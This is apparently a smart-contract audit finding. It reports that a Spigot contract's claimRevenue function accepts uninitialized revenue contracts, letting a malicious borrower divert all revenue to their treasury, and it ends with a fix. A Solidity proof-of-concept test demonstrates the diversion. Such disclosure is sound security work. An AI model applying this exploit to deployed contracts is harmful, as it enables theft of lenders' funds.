# Uninitialized Revenue settings can be used to claim revenue that goes 100% to the treasury

Revenue contracts aren't validated in the `claimRevenue` function of the Spigot contract and a malicious borrower can use an uninitialized revenue contract to send all revenue to their treasury.

## Impact

Using an uninitialized revenue contract will lead to using an uninitialized set of settings, in which all values are empty/zero. This is particularly concerning since the `ownerSplit` setting will be 0.

This would allow a malicious borrower to claim revenue using a non-existent contract address, which will lead to using an uninitialized setting with a `ownerSplit` value of 0. This will split 0% to the spigot and 100% to the treasury, effectively sending all tokens to the borrower's treasury.

## PoC

In this test, the Spigot has a revenue payment of 100 tokens and we call the `claimRevenue` function with a random address that will lead to use an uninitialized set of settings and send the total amount of tokens to the treasury.

Note: the context for this test (setup, variables and helper functions) is similar to the one found in the file `Spigot.t.sol`.

```
function test_ClaimRevenue_UninitializedRevenue() public {
    vm.startPrank(owner);
    
    RevenueToken token = new RevenueToken();
    
    MockRevenueContract revenue = new MockRevenueContract(owner, token);
            
    spigot = new Spigot(owner, treasury, operator);
    
    ISpigot.Setting memory settings = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);
    require(spigot.addSpigot(address(revenue), settings), "Failed to add spigot");
    
    // Revenue pushes payment to spigot
    token.mint(address(revenue), 100);
    revenue.sendPushPayment(address(spigot));
    
    // Use uninitialized revenue to claim token, uninitialized settings have a value of 0
    spigot.claimRevenue(makeAddr("foo"), address(token), hex"");
    
    // Treasury has 100% of the tokens!
    uint256 treasuryBalance = token.balanceOf(treasury);
    assertEq(treasuryBalance, 100);
}
```

## Recommendation

Validate that the revenue contract in the `claimRevenue` function is a valid revenue contract and that its settings are initialized.
